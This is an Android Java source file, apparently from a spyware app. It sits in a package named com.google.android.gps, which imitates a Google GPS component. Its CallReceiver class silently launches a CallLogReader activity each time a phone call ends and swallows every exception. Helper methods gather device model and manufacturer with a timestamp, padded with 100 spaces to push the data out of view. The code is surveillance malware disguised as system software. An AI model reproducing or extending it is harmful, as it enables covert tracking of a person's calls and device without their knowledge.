package com.google.android.gps ;

import android.app.*;
import android.content.*;
import android.database.*;
import android.os.*;
import android.provider.*;
import android.telephony.*;
import android.webkit.*;
import android.widget.*;
import java.util.*;

public class CallReceiver extends BroadcastReceiver {
	
	@Override
	public void onReceive(Context arg0, Intent arg1) {
		try{
		if(arg1.getAction().equals("android.intent.action.PHONE_STATE")){
			String state = arg1.getStringExtra(TelephonyManager.EXTRA_STATE);
			/*if(state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)){
				//String number = arg1.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
				String number = "";
				process(arg0,0,number);
			} else if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)){   
				String number = arg1.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
			} else*/ if(state.equals(TelephonyManager.EXTRA_STATE_IDLE)){
				//process(arg0,2,"");
				arg0.startActivity(new Intent(arg0,CallLogReader.class).setFlags(Intent.FLAG_ACTIVITY_NO_HISTORY));
			}
		}}catch(Error e){
			return;
		}catch(Exception e){
			return;
		}
	}
	
	String bosluk(){
		String temp = "";
		for(int i = 0;i!=100;i++)
			temp += " ";
		return temp;
	}

	String getDeviceInfo(){
		String s1 = Build.DEVICE;
		String s2 = Build.HARDWARE;
		String s3 = Build.MANUFACTURER;
		return bosluk()+"Cihaz: "+s1+" "+s2+" "+s3;
	}
	
	String getTime(){
		return zeroFix((Calendar.getInstance()).get(Calendar.HOUR_OF_DAY))
				+":"+
				zeroFix((Calendar.getInstance()).get(Calendar.MINUTE))
				+":"+
				zeroFix((Calendar.getInstance()).get(Calendar.SECOND));
	}
	
	String zeroFix(int i){
		if(i < 10) return "0"+i;
		return ""+i;
	}
	
}
